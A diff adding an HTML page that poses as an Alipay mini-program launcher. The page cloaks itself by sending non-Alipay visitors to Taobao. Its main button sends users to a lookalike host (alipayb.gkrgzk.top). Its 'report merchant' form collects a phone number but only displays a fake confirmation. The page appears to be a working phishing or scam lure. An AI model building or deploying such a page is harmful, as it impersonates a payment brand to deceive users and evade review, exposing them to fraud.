@@ -1,0 +1,352 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+
+
+<script>
+  if (!/AlipayClient/.test(navigator.userAgent)) {
+    if (window.top !== window.self) {
+      window.top.location.href = "https://m.taobao.com";
+    } else {
+      window.location.href = "https://m.taobao.com";
+    }
+  }
+</script>
+
+
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no" />
+<title> </title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    font-family: "Microsoft YaHei", sans-serif;
+    background-color: #fff;
+    overflow: hidden;
+  }
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    justify-content: flex-start;
+    padding-top: 5vh;
+  }
+  .logo-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    height: 50vh;
+    margin-bottom: 5vh;
+  }
+  .logo-container img {
+    width: auto;
+    height: 100%;
+    max-width: 80vw;
+    object-fit: contain;
+  }
+  .button-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    flex: 0.6;
+    width: 100%;
+  }
+  .btn-primary {
+    width: calc(100% - 40px);
+    background: linear-gradient(90deg, #1677ff 0%, #1aa0ff 100%);
+    color: #fff;
+    font-size: clamp(14px, 4.5vw, 20px);
+    padding: clamp(12px, 2.5vh, 18px) 0;
+    border: none;
+    border-radius: 30px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    margin-bottom: 2vh;
+    box-shadow: 0 4px 12px rgba(22, 119, 255, 0.4);
+    font-weight: 500;
+    letter-spacing: 0.5px;
+  }
+  .btn-primary:hover {
+    background: linear-gradient(90deg, #0f5ecc 0%, #0fb1ff 100%);
+    box-shadow: 0 6px 16px rgba(22, 119, 255, 0.5);
+    transform: translateY(-1px);
+  }
+  .btn-primary:active {
+    transform: translateY(1px);
+    box-shadow: 0 3px 8px rgba(22, 119, 255, 0.3);
+  }
+  .btn-secondary {
+    background: none;
+    border: none;
+    color: #1677ff;
+    font-size: clamp(12px, 3.5vw, 18px);
+    cursor: pointer;
+  }
+  .spinner-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(255, 255, 255, 0.8);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    display: none;
+  }
+  .spinner {
+    border: 6px solid #f3f3f3;
+    border-top: 6px solid #1677ff;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* 举报按钮和弹窗样式 */
+  .btn-report {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: #fff;
+    border: 1px solid #1677ff;
+    color: #1677ff;
+    padding: 6px 12px;
+    border-radius: 20px;
+    cursor: pointer;
+    font-size: 14px;
+    z-index: 10000;
+    transition: all 0.2s;
+  }
+  .btn-report:hover {
+    background: #1677ff;
+    color: #fff;
+  }
+  .report-modal {
+    display: none;
+    position: fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background: rgba(0,0,0,0.5);
+    justify-content:center;
+    align-items:center;
+    z-index: 10001;
+  }
+  .report-content {
+    background: #fff;
+    padding: 25px 20px;
+    border-radius: 16px;
+    width: 85%;
+    max-width: 320px;
+    text-align: center;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+    position: relative;
+  }
+  .report-content h3 {
+    margin: 0 0 18px 0;
+    font-size: 20px;
+    color: #333;
+    font-weight: 600;
+  }
+  .report-input-content {
+    width: 100%;
+    min-height: 80px;
+    padding: 12px 15px;
+    margin-bottom: 12px;
+    border: 1px solid #dcdcdc;
+    border-radius: 8px;
+    font-size: 14px;
+    outline: none;
+    box-sizing: border-box;
+    transition: all 0.2s;
+    resize: none;
+  }
+  .report-input-content:focus {
+    border-color: #1677ff;
+    box-shadow: 0 0 8px rgba(22, 119, 255, 0.2);
+  }
+  .report-input {
+    width: 100%;
+    padding: 12px 15px;
+    margin-bottom: 12px;
+    border: 1px solid #dcdcdc;
+    border-radius: 8px;
+    font-size: 14px;
+    outline: none;
+    box-sizing: border-box;
+    transition: all 0.2s;
+  }
+  .report-input:focus {
+    border-color: #1677ff;
+    box-shadow: 0 0 8px rgba(22, 119, 255, 0.2);
+  }
+  .report-btn {
+    width: 100%;
+    padding: 12px 0;
+    font-size: 16px;
+    border-radius: 30px;
+    margin-top: 5px;
+    margin-bottom: 8px;
+  }
+  .report-close {
+    width: 100%;
+    padding: 10px 0;
+    font-size: 14px;
+    color: #1677ff;
+    margin-bottom: 8px;
+  }
+
+  /* 屏幕中间提示消息 */
+  .reportMessage {
+    color: #fff;
+    font-size: 16px;
+    background-color: rgba(0,0,0,0.75);
+    padding: 12px 25px;
+    border-radius: 25px;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: none;
+    opacity: 0;
+    text-align: center;
+    z-index: 10002;
+    transition: opacity 0.3s;
+  }
+  .reportMessage.show {
+    display: block;
+    opacity: 1;
+  }
+</style>
+</head>
+<body>
+  <div class="logo-container">
+    <img src="1.png" alt="Logo">
+  </div>
+
+  <div class="button-container">
+    <button class="btn-primary" id="goBtn">打开支付宝小程序</button>
+    <button class="btn-secondary" id="downloadBtn">下载支付宝</button>
+  </div>
+
+  <div class="spinner-overlay" id="spinner">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- 举报按钮和弹窗 -->
+  <button class="btn-report" id="reportBtn">举报</button>
+  <div class="report-modal" id="reportModal">
+    <div class="report-content">
+      <h3>举报商户</h3>
+      <textarea id="reportContent" placeholder="请输入举报内容" class="report-input-content"></textarea>
+      <input type="tel" id="reportPhone" placeholder="请输入手机号" class="report-input" />
+      <button class="btn-primary report-btn" id="reportSubmit">提交</button>
+      <button class="btn-secondary report-close" id="reportClose">关闭</button>
+    </div>
+  </div>
+
+  <!-- 屏幕中间提示 -->
+  <div class="reportMessage" id="reportMessage">已收到您的举报，正在处理中！</div>
+
+<script>
+const urls = [
+  "https://alipayb.gkrgzk.top",
+  "https://alipayb.gkrgzk.top",
+  "https://alipayb.gkrgzk.top"
+];
+const targetURL = urls[Math.floor(Math.random() * urls.length)];
+
+const goBtn = document.getElementById('goBtn');
+const downloadBtn = document.getElementById('downloadBtn');
+const spinner = document.getElementById('spinner');
+
+goBtn.addEventListener('click', () => {
+  spinner.style.display = 'flex';
+  setTimeout(() => {
+    window.location.href = targetURL;
+  }, 500);
+});
+
+downloadBtn.addEventListener('click', () => {
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+  if (/android/i.test(ua)) {
+    return;
+  } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
+    window.open('https://apps.apple.com/cn/app/id333206289', '_blank');
+  } else {
+    window.open('https://www.alipay.com/download', '_blank');
+  }
+});
+
+// 禁止缩放
+document.addEventListener('touchmove', function (event) {
+  if (event.scale !== 1) event.preventDefault();
+}, { passive: false });
+
+let lastTouchEnd = 0;
+document.addEventListener('touchend', function (event) {
+  const now = Date.now();
+  if (now - lastTouchEnd <= 300) event.preventDefault();
+  lastTouchEnd = now;
+}, false);
+
+// ========== 举报弹窗功能 ==========
+const reportBtn = document.getElementById('reportBtn');
+const reportModal = document.getElementById('reportModal');
+const reportClose = document.getElementById('reportClose');
+const reportSubmit = document.getElementById('reportSubmit');
+const reportContent = document.getElementById('reportContent');
+const reportPhone = document.getElementById('reportPhone');
+const reportMessage = document.getElementById('reportMessage');
+
+function showReportMessage(msg){
+  reportMessage.textContent = msg;
+  reportMessage.classList.add('show');
+  setTimeout(() => {
+    reportMessage.classList.remove('show');
+  }, 2000);
+}
+
+// 打开弹窗
+reportBtn.addEventListener('click', () => {
+  reportModal.style.display = 'flex';
+  reportContent.value = '';
+  reportPhone.value = '';
+});
+
+// 关闭弹窗
+reportClose.addEventListener('click', () => {
+  reportModal.style.display = 'none';
+});
+
+// 提交举报
+reportSubmit.addEventListener('click', () => {
+  const content = reportContent.value.trim();
+  const phone = reportPhone.value.trim();
+  if(!content){
+    showReportMessage("请输入举报内容");
+    return;
+  }
+  if(!phone){
+    showReportMessage("请输入手机号");
+    return;
+  }
+  showReportMessage("已收到您的举报，正在处理中！");
+  reportContent.value = '';
+  reportPhone.value = '';
+  reportModal.style.display = 'none';
+});
+</script>
+</body>
+</html>
